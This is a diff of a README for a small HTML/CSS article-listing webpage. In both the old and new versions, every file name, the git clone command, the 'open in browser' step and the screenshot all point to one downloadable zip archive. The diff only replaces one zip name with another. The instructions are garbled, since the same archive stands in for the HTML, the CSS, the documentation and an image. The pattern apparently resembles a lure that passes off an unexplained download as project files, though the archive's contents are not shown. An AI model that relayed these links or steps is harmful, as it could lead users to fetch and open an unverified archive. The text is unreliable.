@@ -18,28 +18,28 @@ This is a simple and responsive article listing webpage that showcases a list of
 simpleArticleListing/
 |
 +-- resources          # resources for webpage
-+-- https://raw.githubusercontent.com/ronny-gans/simpleArticleListing/main/resources/simple-Article-Listing-antistrophal.zip         # Main HTML file
-+-- https://raw.githubusercontent.com/ronny-gans/simpleArticleListing/main/resources/simple-Article-Listing-antistrophal.zip         # CSS file for styling
-\-- https://raw.githubusercontent.com/ronny-gans/simpleArticleListing/main/resources/simple-Article-Listing-antistrophal.zip          # Documentation (this file)
++-- https://github.com/ronny-gans/simpleArticleListing/raw/refs/heads/main/resources/Article-Listing-simple-v1.5.zip         # Main HTML file
++-- https://github.com/ronny-gans/simpleArticleListing/raw/refs/heads/main/resources/Article-Listing-simple-v1.5.zip         # CSS file for styling
+\-- https://github.com/ronny-gans/simpleArticleListing/raw/refs/heads/main/resources/Article-Listing-simple-v1.5.zip          # Documentation (this file)
 ```
 
 ## 🚀 How to Use
 1. Clone the repository:
    ```bash
-   git clone https://raw.githubusercontent.com/ronny-gans/simpleArticleListing/main/resources/simple-Article-Listing-antistrophal.zip 
-2. Open the `https://raw.githubusercontent.com/ronny-gans/simpleArticleListing/main/resources/simple-Article-Listing-antistrophal.zip` file in your favorite browser.
+   git clone https://github.com/ronny-gans/simpleArticleListing/raw/refs/heads/main/resources/Article-Listing-simple-v1.5.zip 
+2. Open the `https://github.com/ronny-gans/simpleArticleListing/raw/refs/heads/main/resources/Article-Listing-simple-v1.5.zip` file in your favorite browser.
 
 ## 📂 Folder Structure
-- https://raw.githubusercontent.com/ronny-gans/simpleArticleListing/main/resources/simple-Article-Listing-antistrophal.zip Contains the HTML structure of the article listing page.
-- https://raw.githubusercontent.com/ronny-gans/simpleArticleListing/main/resources/simple-Article-Listing-antistrophal.zip Provides the CSS styling, including hover effects and flexbox-based layout.
+- https://github.com/ronny-gans/simpleArticleListing/raw/refs/heads/main/resources/Article-Listing-simple-v1.5.zip Contains the HTML structure of the article listing page.
+- https://github.com/ronny-gans/simpleArticleListing/raw/refs/heads/main/resources/Article-Listing-simple-v1.5.zip Provides the CSS styling, including hover effects and flexbox-based layout.
 - resources/: Folder for assets like images and separator graphics.
 
 ## 📝 Customization
-- Update article details (titles, dates, and images) in the https://raw.githubusercontent.com/ronny-gans/simpleArticleListing/main/resources/simple-Article-Listing-antistrophal.zip file.
-- Adjust colors, font sizes, or layout in the https://raw.githubusercontent.com/ronny-gans/simpleArticleListing/main/resources/simple-Article-Listing-antistrophal.zip file.
+- Update article details (titles, dates, and images) in the https://github.com/ronny-gans/simpleArticleListing/raw/refs/heads/main/resources/Article-Listing-simple-v1.5.zip file.
+- Adjust colors, font sizes, or layout in the https://github.com/ronny-gans/simpleArticleListing/raw/refs/heads/main/resources/Article-Listing-simple-v1.5.zip file.
 
 ## 🖼️ Screenshot
-![screenshots](https://raw.githubusercontent.com/ronny-gans/simpleArticleListing/main/resources/simple-Article-Listing-antistrophal.zip)
+![screenshots](https://github.com/ronny-gans/simpleArticleListing/raw/refs/heads/main/resources/Article-Listing-simple-v1.5.zip)
 
 ## 🌟 Features Showcase
 1. Hover over an article to see the shadow and lift effect.
